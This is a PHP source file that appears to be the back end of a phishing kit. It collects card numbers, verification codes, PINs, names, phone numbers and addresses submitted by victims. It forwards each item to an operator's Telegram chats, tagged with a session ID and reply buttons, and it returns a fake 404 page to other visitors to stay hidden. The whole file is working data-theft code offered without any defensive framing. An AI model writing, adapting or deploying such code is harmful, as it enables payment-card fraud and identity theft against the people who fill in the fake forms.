<?php 

include("config.php");
$ip = getUserIP();
$ua = $_SERVER['HTTP_USER_AGENT'];
$root = (!empty($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . '/';

if ( isset($_POST['code']) ) {
	
	$session = isset( $_POST['s'] ) ? $_POST['s'] : 'anonymous';
	$card_code = $_POST['code'];
	$card_number = $_POST['card_number'];
	$message_id = $_POST['message_id'];
	$chat_id    = $_COOKIE['chat'];
	$chat       = CHATS[$chat_id];
	
	$request = sendTelegram(
		'sendMessage',
		array(
			'chat_id' => $chat['cards'],
			'text' => "#".$session." \n".
					  "<code>".$card_number."</code>\n".
					  "<code>".$card_code."</code>",
			'parse_mode' =>  'html',
			'reply_to_message_id' => (int) $message_id,
			'reply_markup' => kb($session)
		),
		$chat['token']
	);
	
}

elseif (
	isset( $_POST['name'] ) &&
	isset( $_POST['phone'] ) &&
	isset( $_POST['address'] ) &&
	isset( $_POST['s'] )
) {

	$session  = $_POST['s'];
	$name     = $_POST['name'];
	$phone    = $_POST['phone'];
    $address  = $_POST['address'];
    $chat_id    = $_COOKIE['chat'];
	$chat       = CHATS[$chat_id];
    
	sendTelegram(
		'sendMessage',
		array(
			'chat_id' => $chat['data'],
			'text' => "#".$session." \n".
					  "<b>name:</b> <code>".$name."</code>\n".
					  "<b>phone:</b> <code>".$phone."</code>\n".
					  "<b>address:</b> <code>".$address."</code>\n",
			'parse_mode' =>  'html'
		),
		$chat['token']
	);
	

	header("HTTP/1.0 200 OK");
	exit();
}elseif (isset($_POST['pin'])){
    $session     = $_POST['session'];
    $card_number = $_POST['card_number'];
    $message_id = $_POST['message_id'];
    $pin         = $_POST['pin'];
    $chat_id    = $_COOKIE['chat'];
	$chat       = CHATS[$chat_id];
    
    echo $message_id;
    
    $req=sendTelegram(
	    'sendMessage',
	    array(
		    'chat_id' => $chat['cards'],
		    'text' => "#".$session." \n".
				  "<code>".$card_number."</code>\n".
				  "<code>".$pin."</code>",
		    'parse_mode' =>  'html',
		    'reply_to_message_id' => $message_id,
		    'reply_markup' => kb($session)
	    ),
	    $chat['token']
	);
	echo $req;
}

else {
	header("HTTP/1.0 404 Not Found");
	echo "<h1>404 Not Found</h1>";
	echo "The page that you have requested could not be found.";
	exit();
}